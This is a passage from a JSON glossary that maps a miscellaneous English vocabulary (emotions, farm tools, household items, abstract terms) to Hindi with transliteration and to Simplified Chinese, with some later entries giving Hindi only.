                "Chinese (Simplified)": "午夜 (wǔyè)"
            },
            "fear": {
                "Hindi": "डर (ḍar)",
                "Chinese (Simplified)": "恐惧 (kǒngjù)"
            },
            "consequence": {
                "Hindi": "परिणाम (pariṇām)",
                "Chinese (Simplified)": "后果 (hòuguǒ)"
            },
            "consequences": {
                "Hindi": "परिणाम (pariṇām)",
                "Chinese (Simplified)": "结果 (jiéguǒ)"
            },
            "forbidden": {
                "Hindi": "निषिद्ध (niṣiddh)",
                "Chinese (Simplified)": "被禁止的 (bèi jìnzhǐ de)"
            },
            "desire": {
                "Hindi": "इच्छा (icchā)",
                "Chinese (Simplified)": "渴望 (kěwàng)"
            },
            "promise": {
                "Hindi": "वादा (vaada)",
                "Chinese (Simplified)": "承诺 (chéngnuò)"
            },
            "promise_opposite": {
                "Hindi": "अवहेलना (avahelna) / तोड़ना (toḍnā)",
                "Chinese (Simplified)": "违背 (wéibèi)"
            },
            "footsteps": {
                "Hindi": "कदमों के निशान (kadam ke nishan)",
                "Chinese (Simplified)": "脚步声 (jiǎobù shēng)"
            },
            "rage": {
                "Hindi": "क्रोध (krodh)",
                "Chinese (Simplified)": "愤怒 (fènnù)"
            },
            "ragged": {
                "Hindi": "फटेहाल (fatehaal)",
                "Chinese (Simplified)": "破烂的 (pòlàn de)"
            },
            "hang": {
                "Hindi": "लटकाना (latkāna)",
                "Chinese (Simplified)": "悬挂 (xuánguà)"
            },
            "convince": {
                "Hindi": "मनाना (manāna)",
                "Chinese (Simplified)": "说服 (shuōfú)"
            },
            "excuse": {
                "Hindi": "बहाना (bahāna)",
                "Chinese (Simplified)": "借口 (jièkǒu)"
            },
            "excusing": {
                "Hindi": "माफी मांगना (mafī māngnā)",
                "Chinese (Simplified)": "辩解 (biànjiě)"
            },
            "excused": {
                "Hindi": "माफ किया हुआ (maf kiyā huā)",
                "Chinese (Simplified)": "原谅的 (yuánliàng de)"
            },
            "spit": {
                "Hindi": "थूकना (thūknā)",
                "Chinese (Simplified)": "吐 (tǔ)"
            },
            "pause": {
                "Hindi": "ठहराव (ṭhahrāv)",
                "Chinese (Simplified)": "暂停 (zàntíng)"
            },
            "continue": {
                "Hindi": "जारी रखना (jārī rakhna)",
                "Chinese (Simplified)": "继续 (jìxù)"
            },
            "beat": {
                "Hindi": "धड़कन (dhadkan)",
                "Chinese (Simplified)": "跳动 (tiàodòng)"
            },
            "beats": {
                "Hindi": "धड़कनें (dhadkanen)",
                "Chinese (Simplified)": "节拍 (jiépāi)"
            },
            "vibrate": {
                "Hindi": "कंपन करना (kampan karnā)",
                "Chinese (Simplified)": "振动 (zhèndòng)"
            },
            "vibrating": {
                "Hindi": "कंपित (kampit)",
                "Chinese (Simplified)": "振动中 (zhèndòng zhōng)"
            },
            "stretch": {
                "Hindi": "खिंचाव (khinchāv)",
                "Chinese (Simplified)": "伸展 (shēnzhǎn)"
            },
            "stretched": {
                "Hindi": "खिंचा हुआ (khinchā huā)",
                "Chinese (Simplified)": "拉伸的 (lāshēn de)"
            },
            "ridiculous": {
                "Hindi": "हास्यास्पद (hāsyāspad)",
                "Chinese (Simplified)": "荒谬的 (huāngmiù de)"
            },
            "emphasize": {
                "Hindi": "जोर देना (zor denā)",
                "Chinese (Simplified)": "强调 (qiángdiào)"
            },
            "stroke": {
                "Hindi": "सहलाना (sahlānā)",
                "Chinese (Simplified)": "抚摸 (fǔmō)"
            },
            "stroking": {
                "Hindi": "सहलाना (sahlānā)",
                "Chinese (Simplified)": "抚摸中 (fǔmō zhōng)"
            },
            "triumphantly": {
                "Hindi": "विजयपूर्वक (vijaypūrvak)",
                "Chinese (Simplified)": "得意地 (déyì de)"
            },
            "vantage": {
                "Hindi": "लाभदायक स्थान (lābhdayak sthān)",
                "Chinese (Simplified)": "有利位置 (yǒulì wèizhì)"
            },
            "exchange": {
                "Hindi": "विनिमय (vinimay)",
                "Chinese (Simplified)": "交换 (jiāohuàn)"
            },
            "beneath": {
                "Hindi": "नीचे (nīche)",
                "Chinese (Simplified)": "在...之下 (zài...zhīxià)"
            },
            "steady": {
                "Hindi": "स्थिर (sthir)",
                "Chinese (Simplified)": "稳定的 (wěndìng de)"
            },
            "wrestling": {
                "Hindi": "कुश्ती (kushtī)",
                "Chinese (Simplified)": "摔跤 (shuāijiāo)"
            },
            "wrestlers": {
                "Hindi": "पहलवान (pahalwān)",
                "Chinese (Simplified)": "摔跤选手 (shuāijiāo xuǎnshǒu)"
            },
            "wrestler": {
                "Hindi": "पहलवान (pahalwān)",
                "Chinese (Simplified)": "摔跤手 (shuāijiāo shǒu)"
            },
            "wrestled": {
                "Hindi": "कुश्ती की (kushtī kī)",
                "Chinese (Simplified)": "摔跤了 (shuāijiāo le)"
            },
            "strained": {
                "Hindi": "तनावग्रस्त (tanāvgrast)",
                "Chinese (Simplified)": "紧张的 (jǐnzhāng de)"
            },
            "obscene": {
                "Hindi": "अश्लील (ashlīl)",
                "Chinese (Simplified)": "猥亵的 (wěixiè de)"
            },
            "quickly": {
                "Hindi": "तेजी से (tezī se)",
                "Chinese (Simplified)": "迅速地 (xùnsù de)"
            },
            "urgent": {
                "Hindi": "आपातकालीन (āpātkālīn)",
                "Chinese (Simplified)": "紧急的 (jǐnjí de)"
            },
            "urgently": {
                "Hindi": "तत्काल (tatkāl)",
                "Chinese (Simplified)": "紧急地 (jǐnjí de)"
            },
            "pounding": {
                "Hindi": "धड़कता हुआ (dhadkā huā)",
                "Chinese (Simplified)": "怦怦跳 (pēngpēng tiào)"
            },
            "intimate": {
                "Hindi": "घनिष्ठ (ghanishth)",
                "Chinese (Simplified)": "亲密的 (qīnmì de)"
            },
            "intimacy": {
                "Hindi": "निकटता (nikatā)",
                "Chinese (Simplified)": "亲密 (qīnmì)"
            },
            "determined": {
                "Hindi": "दृढ़ निश्चयी (dridh nishchayī)",
                "Chinese (Simplified)": "坚定的 (jiāndìng de)"
            },
            "determination": {
                "Hindi": "दृढ़ता (dridhatā)",
                "Chinese (Simplified)": "决心 (juéxīn)"
            },
            "determine": {
                "Hindi": "निर्धारित करना (nirdhārit karnā)",
                "Chinese (Simplified)": "决定 (juédìng)"
            },
            "effort": {
                "Hindi": "प्रयास (prayās)",
                "Chinese (Simplified)": "努力 (nǔlì)"
            },
            "efforts": {
                "Hindi": "प्रयास (prayās)",
                "Chinese (Simplified)": "努力 (nǔlì)"
            },
            "agitate": {
                "Hindi": "उत्तेजित करना (uttejit karnā)",
                "Chinese (Simplified)": "煽动 (shāndòng)"
            },
            "agitated": {
                "Hindi": "उत्तेजित (uttejit)",
                "Chinese (Simplified)": "焦虑的 (jiāolǜ de)"
            },
            "agitating": {
                "Hindi": "उत्तेजित कर रहा (uttejit kar rahā)",
                "Chinese (Simplified)": "煽动中 (shāndòng zhōng)"
            },
            "dimension": {
                "Hindi": "आयाम (āyām)",
                "Chinese (Simplified)": "维度 (wéidù)"
            },
            "combine": {
                "Hindi": "मिलाना (milānā)",
                "Chinese (Simplified)": "结合 (jiéhé)"
            },
            "combination": {
                "Hindi": "संयोजन (sanyojan)",
                "Chinese (Simplified)": "结合 (jiéhé)"
            },
            "combined": {
                "Hindi": "मिला हुआ (milā huā)",
                "Chinese (Simplified)": "结合的 (jiéhé de)"
            },
            "shaft": {
                "Hindi": "धुरी (dhurī)",
                "Chinese (Simplified)": "轴 (zhóu)"
            },
            "promising": {
                "Hindi": "आशाजनक (āśājanak)",
                "Chinese (Simplified)": "有前途的 (yǒu qiántú de)"
            },
            "betray": {
                "Hindi": "धोखा देना (dhokhā denā)",
                "Chinese (Simplified)": "背叛 (bèipàn)"
            },
            "promised": {
                "Hindi": "वादा किया हुआ (vāda kiyā huā)",
                "Chinese (Simplified)": "承诺了 (chéngnuò le)"
            },
            "indescribable": {
                "Hindi": "अवर्णनीय (avarṇanīya)",
                "Chinese (Simplified)": "难以形容的 (nányǐ xíngróng de)"
            },
            "sensation": {
                "Hindi": "अनुभूति (anubhūti)",
                "Chinese (Simplified)": "感觉 (gǎnjué)"
            },
            "swirl": {
                "Hindi": "घूमना (ghūmnā)",
                "Chinese (Simplified)": "旋转 (xuánzhuǎn)"
            },
            "sway": {
                "Hindi": "झूलना (jhūlnā)",
                "Chinese (Simplified)": "摇摆 (yáobǎi)"
            },
            "swirling": {
                "Hindi": "घूमता हुआ (ghūmtā huā)",
                "Chinese (Simplified)": "旋转中 (xuánzhuǎn zhōng)"
            },
            "widen": {
                "Hindi": "चौड़ा करना (chaudā karnā)",
                "Chinese (Simplified)": "扩大 (kuòdà)"
            },
            "wide": {
                "Hindi": "चौड़ा (chaudā)",
                "Chinese (Simplified)": "宽的 (kuān de)"
            },
            "spilled": {
                "Hindi": "गिरा हुआ (girā huā)",
                "Chinese (Simplified)": "溢出的 (yìchū de)"
            },
            "spill": {
                "Hindi": "गिराना (girānā)",
                "Chinese (Simplified)": "洒出 (sǎchū)"
            },
            "spelling": {
                "Hindi": "वर्तनी (vartnī)",
                "Chinese (Simplified)": "拼写 (pīnxiě)"
            },
            "deep breath": {
                "Hindi": "गहरी साँस (gahrī sāns)",
                "Chinese (Simplified)": "深呼吸 (shēn hūxī)"
            },
            "wheat": {
                "Hindi": "गेहूं (gehū)",
                "Chinese (Simplified)": "小麦 (xiǎomài)"
            },
            "rice": {
                "Hindi": "चावल (chāval)",
                "Chinese (Simplified)": "水稻 (shuǐdào)"
            },
            "corn": {
                "Hindi": "मक्का (makkā)",
                "Chinese (Simplified)": "玉米 (yùmǐ)"
            },
            "soybean": {
                "Hindi": "सोयाबीन (soyābīn)",
                "Chinese (Simplified)": "大豆 (dàdòu)"
            },
            "potato": {
                "Hindi": "आलू (ālū)",
                "Chinese (Simplified)": "土豆 (tǔdòu)"
            },
            "carrot": {
                "Hindi": "गाजर (gājar)",
                "Chinese (Simplified)": "胡萝卜 (húluóbo)"
            },
            "chili": {
                "Hindi": "मिर्च (mirch)",
                "Chinese (Simplified)": "辣椒 (làjiāo)"
            },
            "plow": {
                "Hindi": "हल (hal)",
                "Chinese (Simplified)": "犁 (lí)"
            },
            "hoe": {
                "Hindi": "कुदाल (kudāl)",
                "Chinese (Simplified)": "锄头 (chútou)"
            },
            "shovel": {
                "Hindi": "फावड़ा (phāvaṛā)",
                "Chinese (Simplified)": "铲子 (chǎnzi)"
            },
            "sickle": {
                "Hindi": "दरांती (darāntī)",
                "Chinese (Simplified)": "镰刀 (liándāo)"
            },
            "axe": {
                "Hindi": "कुल्हाड़ी (kulhāṛī)",
                "Chinese (Simplified)": "斧头 (fǔtóu)"
            },
            "watering can": {
                "Hindi": "पानी का डिब्बा (pānī kā dibbā)",
                "Chinese (Simplified)": "洒水壶 (sǎshuǐhú)"
            },
            "tractor": {
                "Hindi": "ट्रैक्टर (ṭraikaṭar)",
                "Chinese (Simplified)": "拖拉机 (tuōlājī)"
            },
            "seeder": {
                "Hindi": "बीज बोने की मशीन (bīj bone kī maśīn)",
                "Chinese (Simplified)": "播种机 (bōzhǒngjī)"
            },
            "harvester": {
                "Hindi": "कटाई मशीन (kaṭāī maśīn)",
                "Chinese (Simplified)": "收割机 (shōugējī)"
            },
            "wheelbarrow": {
                "Hindi": "ठेला (ṭhelā)",
                "Chinese (Simplified)": "手推车 (shǒutuīchē)"
            },
            "groan": {
                "Hindi": "कराहना (karāhnā)",
                "Chinese (Simplified)": "呻吟 (shēnyín)"
            },
            "groaning": {
                "Hindi": "कराहते हुए (karāhte huye)",
                "Chinese (Simplified)": "呻吟中 (shēnyín zhōng)"
            },
            "shockwaves": {
                "Hindi": "आघात तरंगें (āghāt taraṅgeṁ)",
                "Chinese (Simplified)": "冲击波 (chōngjībō)"
            },
            "greed": {
                "Hindi": "लालच (lālach)",
                "Chinese (Simplified)": "贪婪 (tānlán)"
            },
            "greedily": {
                "Hindi": "लालच से (lālach se)",
                "Chinese (Simplified)": "贪婪地 (tānlán de)"
            },
            "throb": {
                "Hindi": "धड़कना (dhaṛaknā)",
                "Chinese (Simplified)": "悸动 (jìdòng)"
            },
            "throbbing": {
                "Hindi": "धड़कता हुआ (dhaṛaktā huā)",
                "Chinese (Simplified)": "悸动的 (jìdòng de)"
            },
            "depravity": {
                "Hindi": "भ्रष्टता (bhraṣṭatā)",
                "Chinese (Simplified)": "堕落 (duòluò)"
            },
            "ecstasy": {
                "Hindi": "परमानंद (parmānand)",
                "Chinese (Simplified)": "狂喜 (kuángxǐ)"
                },
            "juxtaposition": {
                "Hindi": "सन्निकटन (sannikṭan)",
                "Chinese (Simplified)": "并列 (bìngliè)"
            },
            "ministrations": {
                "Hindi": "सेवाएँ (sevāeṁ)",
                "Chinese (Simplified)": "服侍 (fúshì)"
            },
            "dart": {
                "Hindi": "तीर (tīr)",
                "Chinese (Simplified)": "飞镖 (fēibiāo)"
            },
            "sharp": {
                "Hindi": "तेज़ (tez)",
                "Chinese (Simplified)": "锋利的 (fēnglì de)"
            },
            "enthusiasm": {
                "Hindi": "उत्साह (utsāh)",
                "Chinese (Simplified)": "热情 (rèqíng)"
            },
            "length": {
                "Hindi": "लंबाई (lambaī)",
                "Chinese (Simplified)": "长度 (chángdù)"
            },
            "width": {
                "Hindi": "चौड़ाई (chauṛāī)",
                "Chinese (Simplified)": "宽度 (kuāndù)"
            },
            "appreciative": {
                "Hindi": "कृतज्ञ (kṛtagya)",
                "Chinese (Simplified)": "感激的 (gǎnjī de)"
            },
            "approaching": {
                "Hindi": "पास आना (pās ānā)",
                "Chinese (Simplified)": "接近中 (jiējìn zhōng)"
            },
            "approached": {
                "Hindi": "पास आया (pās āyā)",
                "Chinese (Simplified)": "接近了 (jiējìn le)"
            },
            "seductively": {
                "Hindi": "मोहक ढंग से (mohak ḍhaṅg se)",
                "Chinese (Simplified)": "诱人地 (yòurén de)"
            },
            "imagination": {
                "Hindi": "कल्पना (kalpanā)",
                "Chinese (Simplified)": "想象力 (xiǎngxiànglì)"
            },
            "awake": {
                "Hindi": "जागना (jāgnā)",
                "Chinese (Simplified)": "清醒的 (qīngxǐng de)"
            },
            "awaked": {
                "Hindi": "जागा हुआ (jāgā huā)",
                "Chinese (Simplified)": "醒了 (xǐng le)"
            },
            "awaking": {
                "Hindi": "जाग रहा है (jāg rahā hai)",
                "Chinese (Simplified)": "正在醒来 (zhèngzài xǐnglái)"
            },
            "casual": {
                "Hindi": "आकस्मिक (ākasmik)",
                "Chinese (Simplified)": "随意的 (suíyì de)"
            },
            "fashion": {
                "Hindi": "फ़ैशन (fashion)",
                "Chinese (Simplified)": "时尚 (shíshàng)"
            },
            "fancy": {
                "Hindi": "आकर्षक (ākarṣak)",
                "Chinese (Simplified)": "华丽的 (huálì de)"
            },
            "damp": {
                "Hindi": "गीला (gīlā)",
                "Chinese (Simplified)": "潮湿的 (cháoshī de)"
            },
            "shower": {
                "Hindi": "बौछार (bauchār)",
                "Chinese (Simplified)": "淋浴 (línyù)"
            },
            "coating": {
                "Hindi": "परत (parat)",
                "Chinese (Simplified)": "涂层 (túcéng)"
            },
            "retention": {
                "Hindi": "धारण (dhāraṇ)",
                "Chinese (Simplified)": "保留 (bǎoliú)"
            },
            "challenging": {
                "Hindi": "चुनौतीपूर्ण (cunauteepūrṇ)",
                "Chinese (Simplified)": "具有挑战性的 (jùyǒu tiǎozhàn xìng de)"
            },
            "challenged": {
                "Hindi": "चुनौती दी गई (cunautee dī gaī)",
                "Chinese (Simplified)": "被挑战 (bèi tiǎozhàn)"
            },
            "torture": {
                "Hindi": "यातना (yātnā)",
                "Chinese (Simplified)": "折磨 (zhémó)"
            },
            "anticipation": {
                "Hindi": "प्रत्याशा (pratyāśā)",
                "Chinese (Simplified)": "期待 (qídài)"
            },
            "phantom": {
                "Hindi": "भूत (bhūt)",
                "Chinese (Simplified)": "幽灵 (yōulíng)"
            },
            "thrill": {
                "Hindi": "रोमांच (romānch)",
                "Chinese (Simplified)": "激动 (jīdòng)"
            },
            "suspect": {
                "Hindi": "संदिग्ध (sandigdh)",
                "Chinese (Simplified)": "嫌疑人 (xiányírén)"
            },
            "curtain": {
                "Hindi": "पर्दा (pardā)",
                "Chinese (Simplified)": "窗帘 (chuānglián)"
            },
            "relief": {
                "Hindi": "राहत (rāhat)",
                "Chinese (Simplified)": "缓解 (huǎnjiě)"
            },
            "discard": {
                "Hindi": "त्यागना (tyāgnā)",
                "Chinese (Simplified)": "丢弃 (diūqì)"
            },
            "discarding": {
                "Hindi": "त्याग रहा है (tyāg rahā hai)",
                "Chinese (Simplified)": "正在丢弃 (zhèngzài diūqì)"
            },
            "discarded": {
                "Hindi": "त्यागा हुआ (tyāgā huā)",
                "Chinese (Simplified)": "已丢弃 (yǐ diūqì)"
            },
            "cup": {
                "Hindi": "कप (kap)"
            },
            "cough": {
                "Hindi": "खांसी (khānsi)"
            },
            "bucket": {
                "Hindi": "बाल्टी (bālṭī)"
            },
            "mug": {
                "Hindi": "मग (mag)"
            },
            "note": {
                "Hindi": "नोट (noṭ)"
            },
            "optimize": {
                "Hindi": "सुधारना (sudhārnā)"
            },
            "creativity": {
                "Hindi": "रचनात्मकता (rachnātmaktā)"
            },
            "creative": {
                "Hindi": "रचनात्मक (rachnātmak)"
            },
            "keys": {
                "Hindi": "चाबियाँ (chābiyān)"
            },
            "scramble": {
                "Hindi": "घपला करना (ghaplī karnā)"
            },
            "glue": {
                "Hindi": "गोंद (gond)"
            },
            "occupy": {
                "Hindi": "अधिकार करना (adhikār karnā)"
            },
            "percentage": {
                "Hindi": "प्रतिशत (pratishat)"
            },
            "stake": {
                "Hindi": "दांव (dāṅv)"
            },
            "proceed": {
                "Chinese (Simplified)": "继续 (jì xù)",
                "Hindi": "जारी रखें (jaari rakhen)"
            },
            "kingdom": {
                "Chinese (Simplified)": "王国 (wáng guó)",
                "Hindi": "राज्य (raajy)"
            },
            "verification": {
                "Chinese (Simplified)": "验证 (yàn zhèng)",
                "Hindi": "सत्यापन (satyapan)"
            },
            "go through": {
                "Chinese (Simplified)": "经历 (jīng lì)",
                "Hindi": "सामना करना (saamna karna)"
            },
            "farmhouse": {
                "Chinese (Simplified)": "农舍 (nóng shè)",
                "Hindi": "कृषि गृह (krishi grih)"
            },
            "epic": {
                "Chinese (Simplified)": "史诗 (shǐ shī)",
                "Hindi": "महाकाव्य (mahaakavya)"
            },
            "garden": {
                "Chinese (Simplified)": "花园 (huā yuán)",
                "Hindi": "बाग (baag)"
            },
            "guard": {
                "Chinese (Simplified)": "守卫 (shǒu wèi)",
                "Hindi": "सुरक्षाकर्मी (surakshakarmi)"
            },
            "mosquito": {
                "Chinese (Simplified)": "蚊子 (wén zi)",
                "Hindi": "मच्छर (machhar)"
            },
            "housefly": {
                "Chinese (Simplified)": "苍蝇 (cāng yíng)",
                "Hindi": "मक्खी (makkhi)"
            },
            "don't stop": {
                "Chinese (Simplified)": "不要停止 (bù yào tíng zhǐ)",
                "Hindi": "रोकिए मत (rokiye mat)"
            },
            "era": {
                "Chinese (Simplified)": "时代 (shí dài)",
                "Hindi": "युग (yug)"
            },
            "let's talk": {
                "Chinese (Simplified)": "我们谈谈 (wǒ men tán tán)",
                "Hindi": "चलिए बात करते हैं (chaliye baat karte hain)"
            },
            "rotating": {
                "Chinese (Simplified)": "旋转 (xuán zhuǎn)",
                "Hindi": "घूमना (ghoomna)"
            },
            "rotate": {
                "Chinese (Simplified)": "旋转 (xuán zhuǎn)",
                "Hindi": "घुमाना (ghumaana)"
            },
            "flip": {
                "Chinese (Simplified)": "翻转 (fān zhuǎn)",
                "Hindi": "उलटना (ulṭnā)"
            },
            "hotline bling": {
                "Chinese (Simplified)": "热线铃声 (rè xiàn líng shēng)",
                "Hindi": "हॉटलाइन ब्लिंग (hotline bling)"
            },
            "magician": {
                "Chinese (Simplified)": "魔术师 (mó shù shī)",
                "Hindi": "जादूगर (jaadugar)"
            },
            "gardener": {
                "Chinese (Simplified)": "园丁 (yuán dīng)",
                "Hindi": "माली (maali)"
            },
            "clout": {
                "Chinese (Simplified)": "影响力 (yǐng xiǎng lì)",
                "Hindi": "प्रभाव (prabhaav)"
            },
            "pole": {
                "Chinese (Simplified)": "柱子 (zhù zi)",
                "Hindi": "खंभा (khamba)"
            },
            "sacred": {
                "Chinese (Simplified)": "神圣 (shén shèng)",
                "Hindi": "पवित्र (pavitra)"
            },
            "expected": {
                "Chinese (Simplified)": "预期 (yù qī)",
                "Hindi": "अपेक्षित (apekshit)"
            },
            "unexpected": {
                "Chinese (Simplified)": "出乎意料 (chū hū yì liào)",
                "Hindi": "अप्रत्याशित (apratyashit)"
            },
            "philosophical analysis": {
                "Chinese (Simplified)": "哲学分析 (zhé xué fēn xī)",
                "Hindi": "दार्शनिक विश्लेषण (darshanik vishleshan)"
            },
            "philosophy": {
                "Chinese (Simplified)": "哲学 (zhé xué)",
                "Hindi": "दार्शनिकता (darshanikta)"
            },
            "self knowledge": {
                "Chinese (Simplified)": "自我知识 (zì wǒ zhī shi)",
                "Hindi": "आत्मज्ञान (aatm gyaan)"
            },
            "wisdom": {
                "Chinese (Simplified)": "智慧 (zhì huì)",
                "Hindi": "ज्ञान (gyaan)"
            },
            "approximately": {
                "Chinese (Simplified)": "大约 (dà yuē)",
                "Hindi": "लगभग (lagbhag)"
            },
            "slur": {
                "Chinese (Simplified)": "污蔑 (wū miè)",
                "Hindi": "अपमान (apmaan)"
            },
            "offense": {
                "Chinese (Simplified)": "冒犯 (mào fàn)",
                "Hindi": "अपराध (apraadh)"
            },
            "orient": {
                "Chinese (Simplified)": "定向 (dìng xiàng)",
                "Hindi": "दिशा (dishā)"
            },
            "oriented": {
                "Chinese (Simplified)": "面向 (miàn xiàng)",
                "Hindi": "उन्मुख (unmukh)"
            },
            "fur": {
                "Chinese (Simplified)": "毛皮 (máo pí)",
                "Hindi": "रोम (rom)"
            },
            "feather": {
                "Chinese (Simplified)": "羽毛 (yǔ máo)",
                "Hindi": "पंख (pankh)"
            },
            "membership": {
                "Chinese (Simplified)": "会员资格 (huì yuán zī gé)",
                "Hindi": "सदस्यता (sadasyata)"
            },
            "life ruined": {
                "Chinese (Simplified)": "生活毁了 (shēng huó huǐ le)",
                "Hindi": "जीवन नष्ट हो गया (jeevan nasht ho gaya)"
            },
            "roadmap": {
                "Chinese (Simplified)": "路线图 (lù xiàn tú)",
                "Hindi": "रोडमैप (roadmap)"
            },
            "superpower": {
                "Chinese (Simplified)": "超级大国 (chāo jí dà guó)",
                "Hindi": "महाशक्ति (mahashakti)"
            },
            "timetable": {
                "Chinese (Simplified)": "时间表 (shí jiān biǎo)",
                "Hindi": "समय सारणी (samay saarnee)"
            },
            "click": {
                "Chinese (Simplified)": "点击 (diǎn jí)",
                "Hindi": "क्लिक (klik)"
            },
            "edit": {
                "Chinese (Simplified)": "编辑 (biān jí)",
                "Hindi": "संपादित करें (sampadit karein)"
            },
            "sudden": {
                "Chinese (Simplified)": "突然 (tū rán)",
                "Hindi": "अचानक (achanak)"
            },
            "suddenly": {
                "Chinese (Simplified)": "突然地 (tū rán de)",
                "Hindi": "अचानक (achanak)"
            },
            "compare": {
                "Chinese (Simplified)": "比较 (bǐ jiào)",
                "Hindi": "तुलना करें (tulna karein)"
            },
            "comparison": {
                "Chinese (Simplified)": "比较 (bǐ jiào)",
                "Hindi": "तुलना (tulna)"
            },
            "along": {
                "Chinese (Simplified)": "沿着 (yán zhe)",
                "Hindi": "साथ (saath)"
            },
            "empathy": {
                "Chinese (Simplified)": "同理心 (tóng lǐ xīn)",
                "Hindi": "सहानुभूति (sahanubhuti)"
            },
            "sympathy": {
                "Chinese (Simplified)": "同情 (tóng qíng)",
                "Hindi": "सहानुभूति (sahanubhuti)"
            },
            "encyclopedia": {
                "Chinese (Simplified)": "百科全书 (bǎi kē quán shū)",
                "Hindi": "विश्वकोश (vishwakosh)"
            },
            "volunteers": {
                "Chinese (Simplified)": "志愿者 (zhì yuàn zhě)",
                "Hindi": "स्वयंसेवक (swayamsevak)"
            },
            "host": {
                "Chinese (Simplified)": "主持人 (zhǔ chí rén)",
                "Hindi": "मेजबान (mejban)"
            },
            "hosted": {
                "Chinese (Simplified)": "主持 (zhǔ chí)",
                "Hindi": "मेजबानी की (mejbaani ki)"
            },
            "portal": {
                "Chinese (Simplified)": "门户 (mén hù)",
                "Hindi": "पोर्टल (portal)"
            },
            "maintain": {
                "Chinese (Simplified)": "维护 (wéi hù)",
                "Hindi": "रखना (rakhna)"
            },
            "maintaining": {
                "Chinese (Simplified)": "保持 (bǎo chí)",
                "Hindi": "बनाए रखना (banae rakhna)"
            },
            "maintained": {
                "Chinese (Simplified)": "维护 (wéi hù)",
                "Hindi": "रखा गया (rakha gaya)"
            },
            "presenting information": {
                "Chinese (Simplified)": "提供信息 (tí gōng xìn xī)",
                "Hindi": "सूचना प्रस्तुत करना (soochna prastut karna)"
            },
            "newspaper": {
                "Chinese (Simplified)": "报纸 (bào zhǐ)",
                "Hindi": "अखबार (akhbaar)"
            },
            "cafe": {
                "Chinese (Simplified)": "咖啡馆 (kā fēi guǎn)",
                "Hindi": "कैफ़े (café)"
            },
            "literature": {
                "Chinese (Simplified)": "文学 (wén xué)",
                "Hindi": "साहित्य (sahitya)"
            },
            "precedent": {
                "Chinese (Simplified)": "先例 (xiān lì)",
                "Hindi": "पारंपरिक उदाहरण (paaramparik udaharan)"
            },
            "relocated": {
                "Chinese (Simplified)": "重新安置 (chóng xīn ān zhì)",
                "Hindi": "स्थानांतरित (sthanantarit)"
            },
            "particularly": {
                "Chinese (Simplified)": "特别 (tè bié)",
                "Hindi": "विशेष रूप से (vishesh roop se)"
            },
            "impeached": {
                "Chinese (Simplified)": "弹劾 (tán hé)",
                "Hindi": "महाभियोग (mahaabheeyog)"
            },
            "peached": {
                "Chinese (Simplified)": "被表扬 (bèi biǎo yáng)",
                "Hindi": "प्रशंसा की (prashansa ki)"
            },
            "terrain": {
                "Chinese (Simplified)": "地形 (dì xíng)",
                "Hindi": "भू-भाग (bhoo-bhaag)"
            },
            "spectate": {
                "Chinese (Simplified)": "观看 (guān kàn)",
                "Hindi": "दृष्टा बनना (drishta banna)"
            },
            "acclaim": {
                "Chinese (Simplified)": "称赞 (chēng zàn)",
                "Hindi": "सराहना (saraahna)"
            },
            "circuit": {
                "Chinese (Simplified)": "电路 (diàn lù)",
                "Hindi": "परिपथ (paripath)"
            },
            "primitive": {
                "Chinese (Simplified)": "原始 (yuán shǐ)",
                "Hindi": "प्रारंभिक (prarambhik)"
            },
            "commentators": {
                "Chinese (Simplified)": "评论员 (píng lùn yuán)",
                "Hindi": "टिप्पणीकार (tippanikar)"
            },
            "furnace": {
                "Chinese (Simplified)": "炉子 (lú zi)",
                "Hindi": "भट्ठी (bhatti)"
            },
            "smoke": {
                "Chinese (Simplified)": "烟 (yān)",
                "Hindi": "धुआं (dhuaa)"
            },
            "cigarette": {
                "Chinese (Simplified)": "香烟 (xiāng yān)",
                "Hindi": "सिगरेट (cigarette)"
            },
            "alcohol": {
                "Chinese (Simplified)": "酒精 (jiǔ jīng)",
                "Hindi": "मद्यपान (madyapan)"
            },
            "vice versa": {
                "Chinese (Simplified)": "反之亦然 (fǎn zhī yì rán)",
                "Hindi": "इसके विपरीत (iske vipreet)"
            },
            "durable": {
                "Chinese (Simplified)": "耐用 (nài yòng)",
                "Hindi": "मजबूत (majboot)"
            },
            "durability": {
                "Chinese (Simplified)": "耐用性 (nài yòng xìng)",
                "Hindi": "मजबूती (majbooti)"
            },
            "overworld": {
                "Chinese (Simplified)": "上界 (shàng jiè)",
                "Hindi": "ऊपर की दुनिया (upar ki duniya)"
            },
            "consist": {
                "Chinese (Simplified)": "由...组成 (yóu...zǔ chéng)",
                "Hindi": "समाविष्ट होना (samaavishth hona)"
            },
            "novelist": {
                "Chinese (Simplified)": "小说家 (xiǎo shuō jiā)",
                "Hindi": "उपन्यासकार (upanyaskar)"
            },
            "novel": {
                "Chinese (Simplified)": "小说 (xiǎo shuō)",
                "Hindi": "उपन्यास (upanyas)"
            },
            "bottomless": {
                "Chinese (Simplified)": "无底的 (wú dǐ de)",
                "Hindi": "गहरा (gahara)"
            },
            "void": {
                "Chinese (Simplified)": "空虚 (kōng xū)",
                "Hindi": "शून्य (shoonya)"
            },
            "conclusion": {
                "Chinese (Simplified)": "结论 (jié lùn)",
                "Hindi": "निष्कर्ष (nishkarsh)"
            },
            "teleport": {
                "Chinese (Simplified)": "传送 (chuán sòng)",
                "Hindi": "टेलीपोर्ट (teleport)"
            },
            "time travel": {
                "Chinese (Simplified)": "时间旅行 (shí jiān lǚ xíng)",
                "Hindi": "समय यात्रा (samay yatra)"
            },
            "shelter": {
                "Chinese (Simplified)": "避难所 (bì nàn suǒ)",
                "Hindi": "आश्रय (aashray)"
            },
            "last longer": {
                "Chinese (Simplified)": "持续更长时间 (chí xù gèng cháng shí jiān)",
                "Hindi": "लंबे समय तक चले (lambe samay tak chale)"
            },
            "disturbance": {
                "Chinese (Simplified)": "干扰 (gān rǎo)",
                "Hindi": "विघटन (vighatan)"
            },
            "disturb": {
                "Chinese (Simplified)": "打扰 (dǎ rǎo)",
                "Hindi": "विघटित करना (vighatit karna)"
            },
            "disturbed": {
                "Chinese (Simplified)": "受干扰 (shòu gān rǎo)",
                "Hindi": "विचलित (vichlit)"
            },
            "eventually": {
                "Chinese (Simplified)": "最终 (zuì zhōng)",
                "Hindi": "अंततः (antatah)"
            },
            "attribute": {
                "Chinese (Simplified)": "属性 (shǔ xìng)",
                "Hindi": "गुण (gun)"
            },
            "inherit": {
                "Chinese (Simplified)": "继承 (jì chéng)",
                "Hindi": "विरासत में प्राप्त करना (virasat mein prapt karna)"
            },
            "inherited": {
                "Chinese (Simplified)": "继承的 (jì chéng de)",
                "Hindi": "विरासत में प्राप्त (virasat mein prapt)"
            },
